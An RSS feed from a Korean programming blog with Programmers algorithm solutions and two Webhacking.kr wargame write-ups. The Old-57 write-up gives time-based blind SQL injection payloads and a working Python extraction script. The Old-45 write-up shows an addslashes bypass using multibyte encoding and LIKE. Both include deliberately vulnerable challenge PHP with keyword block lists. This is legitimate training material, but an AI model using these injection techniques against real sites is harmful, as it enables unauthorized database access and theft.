<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>LRTK Blog</title>
    <link>https://lrtk-coder.github.io/</link>
    
    <atom:link href="https://lrtk-coder.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>Coding, Security, IT News 등 정리한 블로그</description>
    <pubDate>Sat, 12 Jun 2021 03:08:21 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>Webhacking.kr Old - 57 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/06/11/Webhacking-kr-Old-57-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/06/11/Webhacking-kr-Old-57-Write-Up/</guid>
      <pubDate>Fri, 11 Jun 2021 18:06:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-57"><a href="#Old-57" class="headerlink" title="Old - 57"></a>Old - 57</h2><p><img src="/images/pasted-680.png"><br>이상한 페이지가 나왔다.<br><br>일단 어떤 기능을 가진 페이지인지 확인과 SQL 에러가 출력되는지 확인하기 위해 <code>&#39;</code>를 넣어봤다.</p><p><img src="/images/pasted-681.png"><br><code>index.php?msg=%27&amp;se=1</code><br>Done이 출력되었다.<br><br>HTTP는 GET 메소드로 msg, se 파라미터를 서버에 전송하고 있었다. msg는 message이고, se는 라디오 버튼이다.</p><p>대충 페이지를 파악을 했으니, 코드를 살펴보겠다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $db = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>($_GET[<span class="string">&#x27;msg&#x27;</span>] &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;se&#x27;</span>]))&#123;</span><br><span class="line">    $_GET[<span class="string">&#x27;msg&#x27;</span>] = addslashes($_GET[<span class="string">&#x27;msg&#x27;</span>]);</span><br><span class="line">    $_GET[<span class="string">&#x27;se&#x27;</span>] = addslashes($_GET[<span class="string">&#x27;se&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/select|and|or|not|&amp;|\||benchmark/i&quot;</span>,$_GET[<span class="string">&#x27;se&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;Access Denied&quot;</span>);</span><br><span class="line">    mysqli_query($db,<span class="string">&quot;insert into chall57(id,msg,pw,op) values(&#x27;<span class="subst">&#123;$_SESSION[&#x27;id&#x27;]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$_GET[&#x27;msg&#x27;]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$flag&#125;</span>&#x27;,<span class="subst">&#123;$_GET[&#x27;se&#x27;]&#125;</span>)&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Done&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(rand(<span class="number">0</span>,<span class="number">100</span>) == <span class="number">1</span>) mysqli_query($db,<span class="string">&quot;delete from chall57&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>해당 코드를 보니, 무조건 msg와 se 파라미터의 값이 있어야 기능을 수행한다.<br><br>msg와 se는 addslashes 함수로 특정 특수문자를 치환하고 se는 추가적으로 preg_match 함수로 <code>select, and, or, not, &amp;, |, benchmark</code>를 검사하고 있다.</p><p>이후, insert문에 파라미터가 들어가는데, chall57의 pw 컬럼의 값이 Flag이다.<br><br>에러 메시지도 출력이 되지 않기 때문에 msg 파라미터에 SQLi 쿼리를 삽입하는 건 아니라고 판단하였다.</p><p>나는 se 파라미터에 if문으로 pw를 찾고자 하였다.</p><blockquote><p><a href="https://ssense.me/42">DB SQL | if 문, case 문, ifnull문</a></p></blockquote><p>또한 SQL이 처리가 된 후 반환 값이 없든 있든 Done이 출력되기 때문에 Sleep 함수를 이용하여 True와 False를 구별하기로 하였다.</p><p><img src="/images/pasted-682.png"><br><code>/index.php?msg=%27&amp;se=if(length(pw)&gt;0,%20sleep(5),%201)</code><br>pw의 길이가 0보다 크기 때문에 True가 되었고, True일 때 값은 sleep(5)이라서 5초 동안 기다리는 모습이다.</p><p>손으로 노가다를 하기엔 힘들어서 파이썬으로 작업하도록 하였다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, string, time</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup <span class="keyword">as</span> bs</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flagLenth</span>(<span class="params">url:<span class="built_in">str</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> count <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.get(url + <span class="string">f&#x27;msg=%27&amp;se=if(LENGTH(pw)=<span class="subst">&#123;count&#125;</span>,%20sleep(5),%201)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(time.time()-start) &gt;= <span class="number">5</span>:</span><br><span class="line">            <span class="keyword">return</span> count</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flagParser</span>(<span class="params">url:<span class="built_in">str</span>, lenth:<span class="built_in">int</span></span>):</span></span><br><span class="line">    flag = <span class="string">&#x27;flag&#123;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, lenth+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> string.ascii_lowercase + string.digits + string.punctuation:</span><br><span class="line">            start = time.time()</span><br><span class="line">            res = requests.get(url + <span class="string">f&#x27;msg=%27&amp;se=if(SUBSTR(pw, <span class="subst">&#123;i&#125;</span>, 1)=<span class="subst">&#123;<span class="built_in">hex</span>(<span class="built_in">ord</span>(s))&#125;</span>,%20sleep(5),%201)&#x27;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(time.time()-start) &gt;= <span class="number">5</span>:</span><br><span class="line">                flag += s</span><br><span class="line">                print(<span class="string">&#x27;flag &gt;&gt;&gt;&#x27;</span>, flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&#x27;https://webhacking.kr/challenge/web-34/index.php?&#x27;</span></span><br><span class="line"></span><br><span class="line">    length = flagLenth(url)</span><br><span class="line">    print(flagParser(url, length))</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-683.png"></p><p><img src="/images/pasted-684.png"><br>Flag를 획득 할 수 있었다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/06/11/Webhacking-kr-Old-57-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 2 - 행렬의 곱셈</title>
      <link>https://lrtk-coder.github.io/2021/06/11/Programmers-Level-2-%ED%96%89%EB%A0%AC%EC%9D%98-%EA%B3%B1%EC%85%88/</link>
      <guid>https://lrtk-coder.github.io/2021/06/11/Programmers-Level-2-%ED%96%89%EB%A0%AC%EC%9D%98-%EA%B3%B1%EC%85%88/</guid>
      <pubDate>Fri, 11 Jun 2021 06:32:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;행렬의-곱셈&quot;&gt;&lt;a href=&quot;#행렬의-곱셈&quot; class=&quot;headerlink&quot; title=&quot;행렬의 곱셈&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/30/lessons/12949&quot;&gt;행</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="행렬의-곱셈"><a href="#행렬의-곱셈" class="headerlink" title="행렬의 곱셈"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/12949">행렬의 곱셈</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>2차원 행렬 arr1과 arr2를 입력받아, arr1에 arr2를 곱한 결과를 반환하는 함수, solution을 완성해주세요.</p><h3 id="제한-조건"><a href="#제한-조건" class="headerlink" title="제한 조건"></a>제한 조건</h3><ul><li>행렬 arr1, arr2의 행과 열의 길이는 2 이상 100 이하입니다.</li><li>행렬 arr1, arr2의 원소는 -10 이상 20 이하인 자연수입니다.</li><li>곱할 수 있는 배열만 주어집니다.</li></ul><h2 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h2><h3 id="방법1"><a href="#방법1" class="headerlink" title="방법1"></a>방법1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">arr1, arr2</span>):</span></span><br><span class="line">    <span class="keyword">return</span> [[<span class="built_in">sum</span>(a*b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(A_row,B_col)) <span class="keyword">for</span> B_col <span class="keyword">in</span> <span class="built_in">zip</span>(*arr2)] <span class="keyword">for</span> A_row <span class="keyword">in</span> arr1]</span><br></pre></td></tr></table></figure><p>해당 코드의 중점은 <code>for B_col in zip(*arr2)</code>에 있다.<br><br>zip 함수를 이용하여, arr2를 변형하여 손쉽게 계산할 수 있었다.</p><table><thead><tr><th>5</th><th>4</th><th>3</th></tr></thead><tbody><tr><td>2</td><td>4</td><td>1</td></tr><tr><td>3</td><td>1</td><td>1</td></tr><tr><td>원본의 arr2를 zip 함수를 이용하면,</td><td></td><td></td></tr></tbody></table><table><thead><tr><th>5</th><th>2</th><th>3</th></tr></thead><tbody><tr><td>4</td><td>4</td><td>1</td></tr><tr><td>3</td><td>1</td><td>1</td></tr><tr><td>로 변형이 가능했다.</td><td></td><td></td></tr></tbody></table><h3 id="방법2"><a href="#방법2" class="headerlink" title="방법2"></a>방법2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">arr1, arr2</span>):</span></span><br><span class="line">    arr1 = np.array(arr1)</span><br><span class="line">    arr2 = np.array(arr2)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> arr1.dot(arr2).tolist()</span><br></pre></td></tr></table></figure><p>Numpy를 이용한 풀이이다.<br><br>Numpy는 행렬이나 일반적으로 대규모 다차원 배열을 쉽게 처리할 수 있는 라이브러리라서 행렬 곱을 지원하고 있다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-2/">Level 2</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-2/">Programmers Level 2</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/06/11/Programmers-Level-2-%ED%96%89%EB%A0%AC%EC%9D%98-%EA%B3%B1%EC%85%88/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 2 - JadenCase 문자열 만들기</title>
      <link>https://lrtk-coder.github.io/2021/06/10/Programmers-Level-2-JadenCase-%EB%AC%B8%EC%9E%90%EC%97%B4-%EB%A7%8C%EB%93%A4%EA%B8%B0/</link>
      <guid>https://lrtk-coder.github.io/2021/06/10/Programmers-Level-2-JadenCase-%EB%AC%B8%EC%9E%90%EC%97%B4-%EB%A7%8C%EB%93%A4%EA%B8%B0/</guid>
      <pubDate>Thu, 10 Jun 2021 15:33:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;JadenCase-문자열-만들기&quot;&gt;&lt;a href=&quot;#JadenCase-문자열-만들기&quot; class=&quot;headerlink&quot; title=&quot;JadenCase 문자열 만들기&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="JadenCase-문자열-만들기"><a href="#JadenCase-문자열-만들기" class="headerlink" title="JadenCase 문자열 만들기"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/12951">JadenCase 문자열 만들기</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>JadenCase란 모든 단어의 첫 문자가 대문자이고, 그 외의 알파벳은 소문자인 문자열입니다. 문자열 s가 주어졌을 때, s를 JadenCase로 바꾼 문자열을 리턴하는 함수, solution을 완성해주세요.</p><h3 id="제한-조건"><a href="#제한-조건" class="headerlink" title="제한 조건"></a>제한 조건</h3><ul><li>s는 길이 1 이상인 문자열입니다.</li><li>s는 알파벳과 공백문자(“ “)로 이루어져 있습니다.</li><li>첫 문자가 영문이 아닐때에는 이어지는 영문은 소문자로 씁니다. ( 첫번째 입출력 예 참고 )</li></ul><h2 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h2><h3 id="방법1"><a href="#방법1" class="headerlink" title="방법1"></a>방법1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">s</span>):</span></span><br><span class="line">    s = s.lower().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    result = [s[i][<span class="number">0</span>].upper() + s[i][<span class="number">1</span>:] <span class="keyword">if</span> s[i] != <span class="string">&#x27;&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s))]</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>.join(result)</span><br></pre></td></tr></table></figure><h3 id="방법2"><a href="#방법2" class="headerlink" title="방법2"></a>방법2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">s</span>):</span></span><br><span class="line">    s=s.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        s[i]=s[i].capitalize()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>.join(s)</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-2/">Level 2</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-2/">Programmers Level 2</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/06/10/Programmers-Level-2-JadenCase-%EB%AC%B8%EC%9E%90%EC%97%B4-%EB%A7%8C%EB%93%A4%EA%B8%B0/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 45 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/06/10/Webhacking-kr-Old-45-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/06/10/Webhacking-kr-Old-45-Write-Up/</guid>
      <pubDate>Thu, 10 Jun 2021 11:38:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-45"><a href="#Old-45" class="headerlink" title="Old - 45"></a>Old - 45</h2><p><img src="/images/pasted-674.png"><br>어디서 많이 본 페이지가 나왔다.</p><p><img src="/images/pasted-675.png"><br>디폴트 값을 Get 메소드로 서버에 보내니, id가 출력되었다.<br><br>코드가 주어져서 확인을 해봤다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;id&#x27;</span>] &amp;&amp; $_GET[<span class="string">&#x27;pw&#x27;</span>])&#123;</span><br><span class="line">$db = dbconnect();</span><br><span class="line">$_GET[<span class="string">&#x27;id&#x27;</span>] = addslashes($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">$_GET[<span class="string">&#x27;pw&#x27;</span>] = addslashes($_GET[<span class="string">&#x27;pw&#x27;</span>]);</span><br><span class="line">$_GET[<span class="string">&#x27;id&#x27;</span>] = mb_convert_encoding($_GET[<span class="string">&#x27;id&#x27;</span>],<span class="string">&#x27;utf-8&#x27;</span>,<span class="string">&#x27;euc-kr&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/admin|select|limit|pw|=|&lt;|&gt;/i&quot;</span>,$_GET[<span class="string">&#x27;id&#x27;</span>])) <span class="keyword">exit</span>();</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/admin|select|limit|pw|=|&lt;|&gt;/i&quot;</span>,$_GET[<span class="string">&#x27;pw&#x27;</span>])) <span class="keyword">exit</span>();</span><br><span class="line">$result = mysqli_fetch_array(mysqli_query($db,<span class="string">&quot;select id from chall45 where id=&#x27;<span class="subst">&#123;$_GET[&#x27;id&#x27;]&#125;</span>&#x27; and pw=md5(&#x27;<span class="subst">&#123;$_GET[&#x27;pw&#x27;]&#125;</span>&#x27;)&quot;</span>));</span><br><span class="line"><span class="keyword">if</span>($result)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;hi <span class="subst">&#123;$result[&#x27;id&#x27;]&#125;</span>&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&quot;admin&quot;</span>) solve(<span class="number">45</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span>(<span class="string">&quot;Wrong&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>코드를 확인해보니, 50번 문제와 유사한 코드가 있었다.<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_GET[<span class="string">&#x27;id&#x27;</span>] = addslashes($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">$_GET[<span class="string">&#x27;pw&#x27;</span>] = addslashes($_GET[<span class="string">&#x27;pw&#x27;</span>]);</span><br><span class="line">$_GET[<span class="string">&#x27;id&#x27;</span>] = mb_convert_encoding($_GET[<span class="string">&#x27;id&#x27;</span>],<span class="string">&#x27;utf-8&#x27;</span>,<span class="string">&#x27;euc-kr&#x27;</span>);</span><br></pre></td></tr></table></figure><p>50번 문제에선 문자의 인코딩 방식이 utf-8로 변경된 것을 이용하여 addslashes 함수에 걸리는 문자 앞에 <code>%a1</code>를 넣어줌으로써 <code>\</code>에 해당하는 <code>%5c</code>는 <code>%a1</code>과 합쳐서 하나의 문자가 나오게 되어 우회를 할 수 있었다.</p><p>나는 해당 코드를 보고 방법이 풀이 방법이 생각이 났다.<br><br>admin을 출력해야하는데, preg_match 함수로 막혀있으니 Hex로 admin을 출력해야한다.</p><p><img src="/images/pasted-676.png"><br>50번 문제처럼 서버에 해당 문제의 코드를 돌려서 테스트를 해보니, 아주 잘 먹혔다.</p><p><img src="/images/pasted-677.png"><br>위 SQLi 쿼리를 삽입을 하니, 아무 반응이 없었다.</p><p><img src="/images/pasted-678.png"><br>그래서 자세히 보기 위해 DataGrip에서 쿼리를 입력하여 해당 결과를 살펴봤다.<br><br>그 결과 나는 한가지 실수를 하였다는 것을 알 수 있었다. 내가 생각한 SQLi 쿼리는 <code>SELECT id FROM chall45 WHERE id=‘?’ or True;</code>이라서 전체 데이터가 출력이 된다. 그래서 문제 페이지에선 제일 먼저 들어간 guest가 맨 위에 있어서 guest가 출력된 것이고, 내 서버는 admin이 먼저 생성이 되어서 admin이 출력된 것이였다.</p><p>이를 해결하기 위해선 <code>SELECT id FROM chall45 WHERE id=‘?’ or id=0x61646D696E;</code>와 같이 id를 지정하면 되는데, 해당 문제에선 <code>=</code>을 검증하고 있기 때문에 <code>LIKE</code>로 우회하여 사용하겠다.</p><p><img src="/images/pasted-679.png"><br>그 결과 Flag를 획득할 수 있었다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/06/10/Webhacking-kr-Old-45-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - 약수의 개수와 덧셈</title>
      <link>https://lrtk-coder.github.io/2021/06/09/Programmers-Level-1-%EC%95%BD%EC%88%98%EC%9D%98-%EA%B0%9C%EC%88%98%EC%99%80-%EB%8D%A7%EC%85%88/</link>
      <guid>https://lrtk-coder.github.io/2021/06/09/Programmers-Level-1-%EC%95%BD%EC%88%98%EC%9D%98-%EA%B0%9C%EC%88%98%EC%99%80-%EB%8D%A7%EC%85%88/</guid>
      <pubDate>Wed, 09 Jun 2021 16:35:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;약수의-개수와-덧셈&quot;&gt;&lt;a href=&quot;#약수의-개수와-덧셈&quot; class=&quot;headerlink&quot; title=&quot;약수의 개수와 덧셈&quot;&gt;&lt;/a&gt;&lt;a href=&quot;http://180.231.28.159:4000/admin/#/posts/ckpq8b</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="약수의-개수와-덧셈"><a href="#약수의-개수와-덧셈" class="headerlink" title="약수의 개수와 덧셈"></a><a href="http://180.231.28.159:4000/admin/#/posts/ckpq8bvv9001y1qp831k4d3us">약수의 개수와 덧셈</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>두 정수 left와 right가 매개변수로 주어집니다. left부터 right까지의 모든 수들 중에서, 약수의 개수가 짝수인 수는 더하고, 약수의 개수가 홀수인 수는 뺀 수를 return 하도록 solution 함수를 완성해주세요.</p><h3 id="제한사항"><a href="#제한사항" class="headerlink" title="제한사항"></a>제한사항</h3><ul><li>1 ≤ left ≤ right ≤ 1,000</li></ul><h2 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h2><h3 id="방법1"><a href="#방법1" class="headerlink" title="방법1"></a>방법1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">left, right</span>):</span></span><br><span class="line">    flag = &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(left, right+<span class="number">1</span>):</span><br><span class="line">        count = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, num//<span class="number">2</span>+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> num%i == <span class="number">0</span>:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> count%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            flag[num] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag[num] = <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">    result = [key <span class="keyword">if</span> flag[key] <span class="keyword">else</span> -key <span class="keyword">for</span> key <span class="keyword">in</span> flag]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(result)</span><br></pre></td></tr></table></figure><h3 id="방법2"><a href="#방법2" class="headerlink" title="방법2"></a>방법2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">left, right</span>):</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(left, right+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(num**<span class="number">0.5</span>) == num**<span 